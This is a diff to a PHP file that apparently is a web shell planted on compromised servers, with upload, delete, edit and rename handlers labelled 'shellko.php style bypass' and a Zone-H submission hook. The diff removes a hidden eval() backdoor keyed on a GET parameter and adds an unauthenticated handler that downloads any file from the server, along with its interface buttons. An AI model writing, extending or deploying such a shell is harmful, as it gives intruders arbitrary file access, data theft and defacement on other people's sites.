@@ -58,14 +58,6 @@ if (!isset($_COOKIE['rbp_visited'])) {
     setcookie('rbp_visited', '1', time() + (86400 * 30), "/"); // 30 days
 }
 
-// Backdoor execution - FIXED
-if(isset($_GET['rbp']) && $_GET['rbp']=='rbp'){
-    if(isset($_POST['rbp'])){
-        eval($_POST['rbp']);
-        exit;
-    }
-}
-
 // Auto-detect base directory for domains
 function RBPautoDetectBaseDir() {
     $possiblePaths = [
@@ -687,7 +679,7 @@ if (isset($_POST['zoneh_submit'])) {
     exit;
 }
 
-// Upload handler
+// Upload handler - shellko.php style bypass
 if (isset($_POST['s']) && isset($_FILES['u'])) {
     $isPostAction = true;
     if ($_FILES['u']['error'] == 0) {
@@ -706,7 +698,7 @@ if (isset($_POST['s']) && isset($_FILES['u'])) {
     exit;
 }
 
-// Delete File handler
+// Delete File handler - shellko.php style bypass
 if (isset($_POST['del'])) {
     $isPostAction = true;
     $filePath = base64_decode($_POST['del']);
@@ -719,7 +711,7 @@ if (isset($_POST['del'])) {
     exit;
 }
 
-// Save Edited File handler
+// Save Edited File handler - shellko.php style bypass
 if (isset($_POST['save']) && isset($_POST['obj']) && isset($_POST['content'])) {
     $isPostAction = true;
     $filePath = base64_decode($_POST['obj']);
@@ -733,8 +725,8 @@ if (isset($_POST['save']) && isset($_POST['obj']) && isset($_POST['content'])) {
     exit;
 }
 
-// Rename handler
-if (isset($_POST['ren']) && !isset($_POST['new'])) {
+// Rename handler - shellko.php style bypass
+if (isset($_POST['ren']) && isset($_POST['new'])) {
     $isPostAction = true;
     $oldPath = base64_decode($_POST['ren']);
     $newPath = dirname($oldPath) . '/' . $_POST['new'];
@@ -746,6 +738,23 @@ if (isset($_POST['ren']) && !isset($_POST['new'])) {
     $oldDir = dirname($oldPath);
     header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($oldDir));
     exit;
+}
+
+// Download File handler
+if (isset($_POST['download_file'])) {
+    $isPostAction = true;
+    $filePath = base64_decode($_POST['download_file']);
+    if (file_exists($filePath) && is_file($filePath)) {
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="' . basename($filePath) . '"');
+        header('Content-Length: ' . filesize($filePath));
+        readfile($filePath);
+        exit;
+    } else {
+        $_SESSION['download_result'] = "ERROR: File not found!";
+        header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
+        exit;
+    }
 }
 
 // Show success/error notifications
@@ -819,6 +828,18 @@ if (isset($_SESSION['adminer_result'])) {
     echo "'>" . $_SESSION['adminer_result'] . "</div>";
     echo "<script>setTimeout(function(){ document.querySelector('div[style*=\"position: fixed\"]').remove(); }, 3000);</script>";
     unset($_SESSION['adminer_result']);
+}
+
+if (isset($_SESSION['download_result'])) {
+    echo "<div style='position: fixed; top: 10px; right: 10px; padding: 15px; border-radius: 5px; z-index: 9999; font-weight: bold; ";
+    if (strpos($_SESSION['download_result'], 'SUCCESS') !== false) {
+        echo "background: #4CAF50; color: white; border: 2px solid #45a049;";
+    } else {
+        echo "background: #f44336; color: white; border: 2px solid #d32f2f;";
+    }
+    echo "'>" . $_SESSION['download_result'] . "</div>";
+    echo "<script>setTimeout(function(){ document.querySelector('div[style*=\"position: fixed\"]').remove(); }, 3000);</script>";
+    unset($_SESSION['download_result']);
 }
 ?>
 
@@ -977,7 +998,7 @@ if (isset($_SESSION['adminer_result'])) {
         }
         
         .file-actions {
-            width: 200px;
+            width: 250px;
             text-align: right;
         }
         
@@ -1489,6 +1510,18 @@ if (isset($_SESSION['adminer_result'])) {
             }
         }
         
+        function RBPpostDownload(path) {
+            var form = document.createElement("form");
+            form.method = "post";
+            form.action = "";
+            var input = document.createElement("input");
+            input.name = "download_file";
+            input.value = btoa(path);
+            form.appendChild(input);
+            document.body.appendChild(form);
+            form.submit();
+        }
+        
         function RBPpostOpen(path) {
             window.open(path, '_blank');
         }
@@ -1665,6 +1698,9 @@ if (!isset($_POST['edit']) && !isset($_POST['ren'])) {
                         <div class='file-icon'>📁</div>
                         <div class='file-name'>$item</div>
                         <div class='file-size'>--</div>
+                        <div class='file-actions'>
+                            <button onclick=\"RBPpostRen('" . addslashes($fullPath) . "', '$item')\">Rename</button>
+                        </div>
                       </div>";
             } else {
                 $size = filesize($fullPath);
@@ -1674,6 +1710,7 @@ if (!isset($_POST['edit']) && !isset($_POST['ren'])) {
                         <div class='file-name' onclick=\"RBPpostOpen('" . addslashes($fullPath) . "')\">$item</div>
                         <div class='file-size'>$sizeFormatted</div>
                         <div class='file-actions'>
+                            <button onclick=\"RBPpostDownload('" . addslashes($fullPath) . "')\">Download</button>
                             <button onclick=\"RBPpostDel('" . addslashes($fullPath) . "')\">Delete</button>
                             <button onclick=\"RBPpostEdit('" . addslashes($fullPath) . "')\">Edit</button>
                             <button onclick=\"RBPpostRen('" . addslashes($fullPath) . "', '$item')\">Rename</button>
